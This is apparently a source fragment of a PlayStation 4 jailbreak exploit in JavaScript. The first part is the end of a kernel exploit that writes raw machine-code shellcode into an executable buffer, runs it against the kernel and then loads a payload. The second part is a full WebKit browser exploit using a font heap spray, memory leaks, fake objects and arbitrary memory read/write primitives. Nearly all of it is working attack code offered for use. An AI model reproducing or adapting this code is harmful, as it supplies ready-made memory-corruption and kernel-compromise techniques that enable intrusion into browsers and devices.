  return new Promise((resolve, reject) => {
  document.body.addEventListener('click',function(e) {

  for (var i = 1; i < NUM_KQUEUES; i += 2) chain.fcall(window.syscalls[6], kqueues[i]);
  chain.run(); 
  if (chain.syscall(23, 0).low == 0) {
   chain.fcall(window.syscalls[73], 0x4000, 0xC000);
   chain.fcall(window.syscalls[325]);
   var patch_buffer = chain.syscall(477, 0x0, 0x4000, 0x7, 0x1000, 0xFFFFFFFF, 0);
   var PBV = p.array_from_address(patch_buffer, 0x1000);
   PBV[0]=0x00000BB8;PBV[1]=0xFE894800;PBV[2]=0x033D8D48;PBV[3]=0x0F000000;PBV[4]=0x4855C305;PBV[5]=0x8B48E589;PBV[6]=0x95E8087E;PBV[7]=0xE8000000;PBV[8]=0x00000175;PBV[9]=0x033615FF;PBV[10]=0x8B480000;PBV[11]=0x0003373D;PBV[12]=0x3F8B4800;PBV[13]=0x74FF8548;PBV[14]=0x3D8D48EB;PBV[15]=0x0000029D;PBV[16]=0xF9358B48;PBV[17]=0x48000002;PBV[18]=0x0322158B;PBV[19]=0x8B480000;PBV[20]=0x00D6E812;PBV[21]=0x8D480000;PBV[22]=0x00029F3D;PBV[23]=0x358B4800;PBV[24]=0x000002E4;PBV[25]=0x05158B48;PBV[26]=0x48000003;PBV[27]=0xB9E8128B;PBV[28]=0x48000000;PBV[29]=0x02633D8D;PBV[30]=0x8B480000;PBV[31]=0x0002BF35;PBV[32]=0x158B4800;PBV[33]=0x000002C8;PBV[34]=0xE8128B48;PBV[35]=0x0000009C;PBV[36]=0x7A3D8D48;PBV[37]=0x48000002;PBV[38]=0x02AA358B;PBV[39]=0x8B480000;PBV[40]=0x0002AB15;PBV[41]=0x128B4800;PBV[42]=0x00007FE8;PBV[43]=0x0185E800;PBV[44]=0xC35D0000;PBV[45]=0x6D3D8948;PBV[46]=0x48000002;PBV[47]=0x026E3D01;PBV[48]=0x01480000;PBV[49]=0x00026F3D;PBV[50]=0x3D014800;PBV[51]=0x00000270;PBV[52]=0x713D0148;PBV[53]=0x48000002;PBV[54]=0x02723D01;PBV[55]=0x01480000;PBV[56]=0x0002933D;PBV[57]=0x3D014800;PBV[58]=0x00000294;PBV[59]=0x653D0148;PBV[60]=0x48000002;PBV[61]=0x02663D01;PBV[62]=0x01480000;PBV[63]=0x0002873D;PBV[64]=0x3D014800;PBV[65]=0x00000288;PBV[66]=0x893D0148;PBV[67]=0x48000002;PBV[68]=0x028A3D01;PBV[69]=0x01480000;PBV[70]=0x00028B3D;PBV[71]=0x3D014800;PBV[72]=0x0000024C;PBV[73]=0x3D3D0148;PBV[74]=0xC3000002;PBV[75]=0xE5894855;PBV[76]=0x10EC8348;PBV[77]=0x24348948;PBV[78]=0x24548948;PBV[79]=0xED15FF08;PBV[80]=0x48000001;PBV[81]=0x4B74C085;PBV[82]=0x48C28948;PBV[83]=0x4840408B;PBV[84]=0x2F74C085;PBV[85]=0x28788B48;PBV[86]=0x243C3B48;PBV[87]=0x8B480A74;PBV[88]=0xC0854800;PBV[89]=0xECEB1D74;PBV[90]=0x18788B48;PBV[91]=0x74FF8548;PBV[92]=0x7F8B48ED;PBV[93]=0x7C3B4810;PBV[94]=0xE2750824;PBV[95]=0xFF1040C7;PBV[96]=0x48FFFFFF;PBV[97]=0x31107A8D;PBV[98]=0x31D231F6;PBV[99]=0xA515FFC9;PBV[100]=0x48000001;PBV[101]=0x5D10C483;PBV[102]=0x894855C3;PBV[103]=0xC0200FE5;PBV[104]=0xFFFF2548;PBV[105]=0x220FFFFE;PBV[106]=0x3D8B48C0;PBV[107]=0x000001C8;PBV[108]=0x909007C7;PBV[109]=0x47C79090;PBV[110]=0x48909004;PBV[111]=0x358B48B8;PBV[112]=0x000001AC;PBV[113]=0x08778948;PBV[114]=0x651047C7;PBV[115]=0xC73C8B48;PBV[116]=0x00251447;PBV[117]=0x47C70000;PBV[118]=0x89480018;PBV[119]=0x1C47C738;PBV[120]=0xB8489090;PBV[121]=0x7D358B48;PBV[122]=0x48000001;PBV[123]=0xC7207789;PBV[124]=0xC7482847;PBV[125]=0x47C70100;PBV[126]=0x0000002C;PBV[127]=0x778D48E9;PBV[128]=0x158B4834;PBV[129]=0x00000150;PBV[130]=0x89F22948;PBV[131]=0x8B483057;PBV[132]=0x00016B35;PBV[133]=0x568D4800;PBV[134]=0xD7294805;PBV[135]=0xC148FF89;PBV[136]=0x814808E7;PBV[137]=0x0000E9CF;PBV[138]=0x3E894800;PBV[139]=0x00000D48;PBV[140]=0x220F0001;PBV[141]=0x55C35DC0;PBV[142]=0x0FE58948;PBV[143]=0x2548C020;PBV[144]=0xFFFEFFFF;PBV[145]=0x48C0220F;PBV[146]=0x013A3D8B;PBV[147]=0x07C70000;PBV[148]=0x00C3C031;PBV[149]=0x353D8B48;PBV[150]=0xC7000001;PBV[151]=0xC3C03107;PBV[152]=0x3D8B4800;PBV[153]=0x00000130;PBV[154]=0xC03107C7;PBV[155]=0x8B4800C3;PBV[156]=0x00012B3D;PBV[157]=0x3107C700;PBV[158]=0x4800C3C0;PBV[159]=0x00A63D8B;PBV[160]=0x87C70000;PBV[161]=0x001F1E01;PBV[162]=0x9090F631;PBV[163]=0x1E0587C7;PBV[164]=0xC931001F;PBV[165]=0x87C79090;PBV[166]=0x001F1E09;PBV[167]=0x9090D231;PBV[168]=0x1E3E87C7;PBV[169]=0xC931001F;PBV[170]=0x0D489090;PBV[171]=0x00010000;PBV[172]=0xFFC0220F;PBV[173]=0x0000EF15;PBV[174]=0xC0200F00;PBV[175]=0xFFFF2548;PBV[176]=0x220FFFFE;PBV[177]=0x3D8B48C0;PBV[178]=0x000000DC;PBV[179]=0xC03107C7;PBV[180]=0x0D4800C3;PBV[181]=0x00010000;PBV[182]=0x5DC0220F;PBV[183]=0x737973C3;PBV[184]=0x5F6D6574;PBV[185]=0x70737573;PBV[186]=0x5F646E65;PBV[187]=0x73616870;PBV[188]=0x705F3265;PBV[189]=0x735F6572;PBV[190]=0x00636E79;PBV[191]=0x74737973;PBV[192]=0x725F6D65;PBV[193]=0x6D757365;PBV[194]=0x68705F65;PBV[195]=0x32657361;PBV[196]=0x73797300;PBV[197]=0x5F6D6574;PBV[198]=0x75736572;PBV[199]=0x705F656D;PBV[200]=0x65736168;PBV[201]=0x90900033;PBV[202]=0x00000000;PBV[203]=0x00000000;PBV[204]=0x000F88F0;PBV[205]=0x00000000;PBV[206]=0x002EF170;PBV[207]=0x00000000;PBV[208]=0x00018DF0;PBV[209]=0x00000000;PBV[210]=0x00018EF0;PBV[211]=0x00000000;PBV[212]=0x02654110;PBV[213]=0x00000000;PBV[214]=0x00097230;PBV[215]=0x00000000;PBV[216]=0x00402E60;PBV[217]=0x00000000;PBV[218]=0x01520108;PBV[219]=0x00000000;PBV[220]=0x01520100;PBV[221]=0x00000000;PBV[222]=0x00462D20;PBV[223]=0x00000000;PBV[224]=0x00462DFC;PBV[225]=0x00000000;PBV[226]=0x006259A0;PBV[227]=0x00000000;PBV[228]=0x006268D0;PBV[229]=0x00000000;PBV[230]=0x00625DC0;PBV[231]=0x00000000;PBV[232]=0x00626290;PBV[233]=0x00000000;PBV[234]=0x00626720;PBV[235]=0x00000000;
   chain.fcall(window.syscalls[203], patch_buffer, 0x4000);
   chain.fcall(patch_buffer, p.read8(KERNEL_BASE_PTR));
   chain.fcall(window.syscalls[73], patch_buffer, 0x4000);
   chain.run();
   if(localStorage.HenLoaded=="yes" && sessionStorage.HenLoaded!="yes"){setTimeout(runBinLoader,500);}
   else if(localStorage.HenLoaded=="yes" && sessionStorage.HenLoaded=="yes"){allset();}
   else if(localStorage.HenLoaded!="yes"){setTimeout(loadPayload,500);}
   return; 
  }
  alert("Kernel Exploit Gagal! Restart PS4 dan coba lagi.");
  p.write8(0, 0);
  return;
  
  resolve(something);
  }, {once: true});
  });
 };

 function runKEX() {
  extra_gadgets();
  kchain_setup();
  object_setup();
  trigger_spray();
 }
 runKEX();
}

function webkitExploit() {
 StartTimer();
 var PAGE_SIZE = 16384;
 var SIZEOF_CSS_FONT_FACE = 0xb8;
 var HASHMAP_BUCKET = 208;
 var STRING_OFFSET = 20;
 var SPRAY_FONTS = 0x100a;
 var GUESS_FONT = 0x200430000;
 var NPAGES = 20;
 var INVALID_POINTER = 0;
 var HAMMER_FONT_NAME = "font8";
 var HAMMER_NSTRINGS = 700;
 var union = new ArrayBuffer(8);
 var union_b = new Uint8Array(union);
 var union_i = new Uint32Array(union);
 var union_f = new Float64Array(union);
 var bad_fonts = [];
 for (var i = 0; i < SPRAY_FONTS; i++)
  bad_fonts.push(new FontFace("font1", "", {}));
 var good_font = new FontFace("font2", "url(data:text/html,)", {});
 bad_fonts.push(good_font);
 var arrays = [];
 for (var i = 0; i < 512; i++)
  arrays.push(new Array(31));
 arrays[256][0] = 1.5;
 arrays[257][0] = {};
 arrays[258][0] = 1.5;
 var jsvalue = {
  a: arrays[256],
  b: new Uint32Array(1),
  c: true
 };
 var string_atomifier = {};
 var string_id = 10000000;
 function ptrToString(p) {
  var s = '';
  for (var i = 0; i < 8; i++) {
   s += String.fromCharCode(p % 256);
   p = (p - p % 256) / 256;
  }
  return s;
 }
 function stringToPtr(p, o) {
  if (o === undefined)
   o = 0;
  var ans = 0;
  for (var i = 7; i >= 0; i--)
   ans = 256 * ans + p.charCodeAt(o + i);
  return ans;
 }
 var strings = [];
 function mkString(l, head) {
  var s = head + '\u0000'.repeat(l - STRING_OFFSET - 8 - head.length) + (string_id++);
  string_atomifier[s] = 1;
  strings.push(s);
  return s;
 }
 var guf = GUESS_FONT;
 var ite = true;
 var matches = 0;
 var round = 0;
 window.ffses = {};
 do {
  var p_s = ptrToString(NPAGES + 2);
  for (var i = 0; i < NPAGES; i++)
   p_s += ptrToString(guf + i * PAGE_SIZE);
  p_s += ptrToString(INVALID_POINTER);
  for (var i = 0; i < 256; i++)
   mkString(HASHMAP_BUCKET, p_s);
  var ffs = ffses["search_" + (++round)] = new FontFaceSet(bad_fonts);
  var badstr1 = mkString(HASHMAP_BUCKET, p_s);
  var guessed_font = null;
  var guessed_addr = null;
  for (var i = 0; i < SPRAY_FONTS; i++) {
   bad_fonts[i].family = "search" + round;
   if (badstr1.substr(0, p_s.length) != p_s) {
    guessed_font = i;
    var p_s1 = badstr1.substr(0, p_s.length);
    for (var i = 1; i <= NPAGES; i++) {
     if (p_s1.substr(i * 8, 8) != p_s.substr(i * 8, 8)) {
      guessed_addr = stringToPtr(p_s.substr(i * 8, 8));
      break;
     }
    }
    if (matches++ == 0) {
     guf = guessed_addr + 2 * PAGE_SIZE;
     guessed_addr = null;
    }
    break;
   }
  }
  if ((ite = !ite))
   guf += NPAGES * PAGE_SIZE;
 } while (guessed_addr === null);
 var p_s = '';
 p_s += ptrToString(26);
 p_s += ptrToString(guessed_addr);
 p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
 for (var i = 0; i < 19; i++)
  p_s += ptrToString(INVALID_POINTER);
 for (var i = 0; i < 256; i++)
  mkString(HASHMAP_BUCKET, p_s);
 var needfix = [];
 for (var i = 0; ; i++) {
  ffses["ffs_leak_" + i] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], good_font]);
  var badstr2 = mkString(HASHMAP_BUCKET, p_s);
  needfix.push(mkString(HASHMAP_BUCKET, p_s));
  bad_fonts[guessed_font].family = "evil2";
  bad_fonts[guessed_font + 1].family = "evil3";
  var leak = stringToPtr(badstr2.substr(badstr2.length - 8));
  if (leak < 0x1000000000000)
   break;
 }
 function makeReader(read_addr, ffs_name) {
  var fake_s = '';
  fake_s += '0000';
  fake_s += '\u00ff\u0000\u0000\u0000\u00ff\u00ff\u00ff\u00ff';
  fake_s += ptrToString(read_addr);
  fake_s += ptrToString(0x80000014);
  p_s = '';
  p_s += ptrToString(29);
  p_s += ptrToString(guessed_addr);
  p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
  p_s += ptrToString(guessed_addr + 2 * SIZEOF_CSS_FONT_FACE);
  for (var i = 0; i < 18; i++)
   p_s += ptrToString(INVALID_POINTER);
  for (var i = 0; i < 256; i++)
   mkString(HASHMAP_BUCKET, p_s);
  var the_ffs = ffses[ffs_name] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], bad_fonts[guessed_font + 2], good_font]);
  mkString(HASHMAP_BUCKET, p_s);
  var relative_read = mkString(HASHMAP_BUCKET, fake_s);
  bad_fonts[guessed_font].family = ffs_name + "_evil1";
  bad_fonts[guessed_font + 1].family = ffs_name + "_evil2";
  bad_fonts[guessed_font + 2].family = ffs_name + "_evil3";
  needfix.push(relative_read);
  if (relative_read.length < 1000)
   return makeReader(read_addr, ffs_name + '_');
  return relative_read;
 }
 var fastmalloc = makeReader(leak, 'ffs3');
 for (var i = 0; i < 100000; i++)
  mkString(128, '');
 var props = [];
 for (var i = 0; i < 0x10000; i++) {
  props.push({
   value: 0x41434442
  });
  props.push({
   value: jsvalue
  });
 }
 var jsvalue_leak = null;
 while (jsvalue_leak === null) {
  Object.defineProperties({}, props);
  for(var i = fastmalloc.indexOf("\u0042\u0044\u0043\u0041\u0000\u0000\u00fe\u00ff");; i++) {
   if (fastmalloc.charCodeAt(i) == 0x42 && fastmalloc.charCodeAt(i + 1) == 0x44 && fastmalloc.charCodeAt(i + 2) == 0x43 && fastmalloc.charCodeAt(i + 3) == 0x41 && fastmalloc.charCodeAt(i + 4) == 0 && fastmalloc.charCodeAt(i + 5) == 0 && fastmalloc.charCodeAt(i + 6) == 254 && fastmalloc.charCodeAt(i + 7) == 255 && fastmalloc.charCodeAt(i + 24) == 14) {
    jsvalue_leak = stringToPtr(fastmalloc, i + 32);
    break;
   }
  }
 }
 var rd_leak = makeReader(jsvalue_leak, 'ffs4');
 var array256 = stringToPtr(rd_leak, 16);
 var ui32a = stringToPtr(rd_leak, 24);
 var rd_arr = makeReader(array256, 'ffs5');
 var butterfly = stringToPtr(rd_arr, 8);
 var rd_ui32 = makeReader(ui32a, 'ffs6');
 for (var i = 0; i < 8; i++)
  union_b[i] = rd_ui32.charCodeAt(i);
 var structureid_low = union_i[0];
 var structureid_high = union_i[1];
 union_i[0] = 0x10000;
 union_i[1] = 0;
 arrays[257][1] = {};
 arrays[257][0] = union_f[0];
 union_i[0] = (guessed_addr + 12 * SIZEOF_CSS_FONT_FACE) | 0;
 union_i[1] = (guessed_addr - guessed_addr % 0x100000000) / 0x100000000;
 arrays[256][i] = union_f[0];
 pp_s = '';
 pp_s += ptrToString(56);
 for (var i = 0; i < 12; i++)
  pp_s += ptrToString(guessed_addr + i * SIZEOF_CSS_FONT_FACE);
 var fake_s = '';
 fake_s += '0000';
 fake_s += ptrToString(INVALID_POINTER);
 fake_s += ptrToString(butterfly);
 fake_s += '\u0000\u0000\u0000\u0000\u0022\u0000\u0000\u0000';
 var ffs7_args = [];
 for (var i = 0; i < 12; i++)
  ffs7_args.push(bad_fonts[guessed_font + i]);
 ffs7_args.push(good_font);
 var ffs8_args = [bad_fonts[guessed_font + 12]];
 for (var i = 0; i < 5; i++)
  ffs8_args.push(new FontFace(HAMMER_FONT_NAME, "url(data:text/html,)", {}));
 for (var i = 0; i < HAMMER_NSTRINGS; i++)
  mkString(HASHMAP_BUCKET, pp_s);
 ffses.ffs7 = new FontFaceSet(ffs7_args);
 mkString(HASHMAP_BUCKET, pp_s);
 ffses.ffs8 = new FontFaceSet(ffs8_args);
 var post_ffs = mkString(HASHMAP_BUCKET, fake_s);
 needfix.push(post_ffs);
 for (var i = 0; i < 13; i++)
  bad_fonts[guessed_font + i].family = "hammer" + i;
 function boot_addrof(obj) {
  arrays[257][32] = obj;
  union_f[0] = arrays[258][0];
  return union_i[1] * 0x100000000 + union_i[0];
 }
 function boot_fakeobj(addr) {
  union_i[0] = addr;
  union_i[1] = (addr - addr % 0x100000000) / 0x100000000;
  arrays[258][0] = union_f[0];
  return arrays[257][32];
 }
 var arw_master = new Uint32Array(8);
 var arw_slave = new Uint8Array(1);
 var obj_master = new Uint32Array(8);
 var obj_slave = {
  obj: null
 };
 var addrof_slave = boot_addrof(arw_slave);
 var addrof_obj_slave = boot_addrof(obj_slave);
 union_i[0] = structureid_low;
 union_i[1] = structureid_high;
 union_b[6] = 7;
 var obj = {
  jscell: union_f[0],
  butterfly: true,
  buffer: arw_master,
  size: 0x5678
 };
 function i48_put(x, a) {
  a[4] = x | 0;
  a[5] = (x / 4294967296) | 0;
 }
 function i48_get(a) {
  return a[4] + a[5] * 4294967296;
 }
 window.addrof = function (x) {
  obj_slave.obj = x;
  return i48_get(obj_master);
 };
 window.fakeobj = function (x) {
  i48_put(x, obj_master);
  return obj_slave.obj;
 };
 function read_mem_setup(p, sz) {
  i48_put(p, arw_master);
  arw_master[6] = sz;
 }
 window.read_mem = function (p, sz) {
  read_mem_setup(p, sz);
  var arr = [];
  for (var i = 0; i < sz; i++)
   arr.push(arw_slave[i]);
  return arr;
 };
 window.write_mem = function (p, data) {
  read_mem_setup(p, data.length);
  for (var i = 0; i < data.length; i++)
   arw_slave[i] = data[i];
 };
 window.read_ptr_at = function (p) {
  var ans = 0;
  var d = read_mem(p, 8);
  for (var i = 7; i >= 0; i--)
   ans = 256 * ans + d[i];
  return ans;
 };
 window.write_ptr_at = function (p, d) {
  var arr = [];
  for (var i = 0; i < 8; i++) {
   arr.push(d & 0xff);
   d /= 256;
  }
  write_mem(p, arr);
 };
 (function () {
  var magic = boot_fakeobj(boot_addrof(obj) + 16);
  magic[4] = addrof_slave;
  magic[5] = (addrof_slave - addrof_slave % 0x100000000) / 0x100000000;
  obj.buffer = obj_master;
  magic[4] = addrof_obj_slave;
  magic[5] = (addrof_obj_slave - addrof_obj_slave % 0x100000000) / 0x100000000;
  magic = null;
 })();
 (function () {
  var ffs_addr = read_ptr_at(addrof(post_ffs) + 8) - 208;
  write_mem(ffs_addr, read_mem(ffs_addr - 96, 208));
  for (var i = 0; i < needfix.length; i++) {
   var addr = read_ptr_at(addrof(needfix[i]) + 8);
   write_ptr_at(addr, (HASHMAP_BUCKET - 20) * 0x100000000 + 1);
   write_ptr_at(addr + 8, addr + 20);
   write_ptr_at(addr + 16, 0x80000014);
  }
  write_ptr_at(butterfly + 248, 0x1f0000001f);
 })();
 var expl_master = new Uint32Array(8);
 var expl_slave = new Uint32Array(2);
 var addrof_expl_slave = addrof(expl_slave);
 var m = fakeobj(addrof(obj) + 16);
 obj.buffer = expl_slave;
 m[7] = 1;
 obj.buffer = expl_master;
 m[4] = addrof_expl_slave;
 m[5] = (addrof_expl_slave - addrof_expl_slave % 0x100000000) / 0x100000000;
 m[7] = 1;
 var prim = {
  write8: function (addr, value) {
   expl_master[4] = addr.low;
   expl_master[5] = addr.hi;
   if (value instanceof int64) {
    expl_slave[0] = value.low;
    expl_slave[1] = value.hi;
   } else {
    expl_slave[0] = value;
    expl_slave[1] = 0;
   }
  },
  write4: function (addr, value) {
   expl_master[4] = addr.low;
   expl_master[5] = addr.hi;
   if (value instanceof int64) {
    expl_slave[0] = value.low;
   } else {
    expl_slave[0] = value;
   }
  },
  write2: function (addr, value) {
   expl_master[4] = addr.low;
   expl_master[5] = addr.hi;
   var tmp = expl_slave[0] & 0xFFFF0000;
   if (value instanceof int64) {
    expl_slave[0] = ((value.low & 0xFFFF) | tmp);
   } else {
    expl_slave[0] = ((value & 0xFFFF) | tmp);
   }
  },
  write1: function (addr, value) {
   expl_master[4] = addr.low;
   expl_master[5] = addr.hi;
   var tmp = expl_slave[0] & 0xFFFFFF00;
   if (value instanceof int64) {
    expl_slave[0] = ((value.low & 0xFF) | tmp);
   } else {
    expl_slave[0] = ((value & 0xFF) | tmp);
   }
  },
  read8: function (addr) {
   expl_master[4] = addr.low;
   expl_master[5] = addr.hi;
   return new int64(expl_slave[0], expl_slave[1]);
  },
  read4: function (addr) {
   expl_master[4] = addr.low;
   expl_master[5] = addr.hi;
   return expl_slave[0];
  },
  read2: function (addr) {
   expl_master[4] = addr.low;
   expl_master[5] = addr.hi;
   return expl_slave[0] & 0xFFFF;
  },
  read1: function (addr) {
   expl_master[4] = addr.low;
   expl_master[5] = addr.hi;
   return expl_slave[0] & 0xFF;
  },
  leakval: function (obj) {
   obj_slave.obj = obj;
   return new int64(obj_master[4], obj_master[5]);
  }
 };
 EndTimer();
 window.p = prim;
 run_hax();
}
